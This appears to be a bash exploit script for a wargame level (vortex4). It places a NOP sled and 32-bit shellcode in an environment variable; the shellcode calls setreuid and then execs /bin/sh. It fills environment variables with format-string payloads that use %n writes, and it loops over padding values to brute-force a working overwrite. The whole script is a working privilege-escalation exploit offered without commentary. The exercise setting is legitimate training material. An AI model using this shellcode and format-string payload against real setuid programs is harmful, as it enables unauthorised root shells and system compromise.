for j in {9000..10000}; do
    unset $(env | cut -d= -f1)  # cleanup envs
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
    export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
    for i in {A..Z}; do
        export "${i}"="$(python3 -c "import sys; sys.stdout.buffer.write(b'AAAA\x08\xc0\x04\x08BBBB\x0a\xc0\x04\x08AAA%54803d.' + b'%p.' * 153 + b'%n.%${j}d.%n.' + b'%p.' * 3)")"
    done
    export SHELL=/bin/bash
    export LANG=C.UTF-8
    export LC_CTYPE=UTF-8
    export LC_TYPE=en_US.UTF-8
    export LC_ALL=en_US.UTF-8
    _=/usr/bin/env

    ./vortex4_execv
    echo "j=$j "
done
